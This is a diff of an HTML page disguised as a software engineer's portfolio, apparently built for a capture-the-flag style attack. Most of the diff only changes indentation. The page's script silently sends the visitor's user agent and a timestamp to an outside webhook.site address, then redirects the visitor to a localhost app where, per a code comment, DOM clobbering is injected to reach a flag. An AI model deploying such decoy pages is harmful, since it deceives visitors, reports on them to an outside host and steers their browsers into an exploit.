@@ -1,32 +1,32 @@
-  <!DOCTYPE html>
-  <html>
-  <head>
-      <title>Michael Thompson - Senior Software Engineer</title>
-      <meta charset="UTF-8">
-      <meta http-equiv="refresh" content="1;url=http://localhost:8400/#messages">
-      <style>
-          body { font-family: Arial, sans-serif; text-align: center; padding: 100px;
-  background: #f4f4f4; }
-          .loading { color: #2c3e50; font-size: 18px; }
-      </style>
-  </head>
-  <body>
-      <h1>Michael Thompson</h1>
-      <p class="loading">Loading portfolio projects...</p>
+     <!DOCTYPE html>
+     <html>
+     <head>
+         <title>Michael Thompson - Senior Software Engineer</title>
+         <meta charset="UTF-8">
+         <meta http-equiv="refresh" content="1;url=http://localhost:8400/#messages">
+         <style>
+             body { font-family: Arial, sans-serif; text-align: center; padding: 100px; background: #f4f4f4; }
+             .loading { color: #2c3e50; font-size: 18px; }
+         </style>
+     </head>
+     <body>
+         <h1>Michael Thompson</h1>
+         <p class="loading">Loading portfolio projects...</p>
 
-      <script>
-          // Send confirmation
-          try {
-              const img = new Image();
-              img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/LOCALHOST-REDIRECT?action=redirecting_to_localhost&timestamp=' + Date.now() +
-  '&user_agent=' + encodeURIComponent(navigator.userAgent);
-              document.body.appendChild(img);
-          } catch(e) {}
+         <script>
+             // Send confirmation
+             try {
+                 const img = new Image();
+                 img.src =
+     'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/LOCALHOST-REDIRECT?action=redirecting_to_localhost&timestamp='
+      + Date.now() + '&user_agent=' + encodeURIComponent(navigator.userAgent);
+                 document.body.appendChild(img);
+             } catch(e) {}
 
-          // Redirect to localhost where DOM clobbering is injected and flag exists
-          setTimeout(() => {
-              window.location.replace('http://localhost:8400/#messages');
-          }, 1000);
-      </script>
-  </body>
-  </html>
+             // Redirect to localhost where DOM clobbering is injected and flag exists
+             setTimeout(() => {
+                 window.location.replace('http://localhost:8400/#messages');
+             }, 1000);
+         </script>
+     </body>
+     </html>
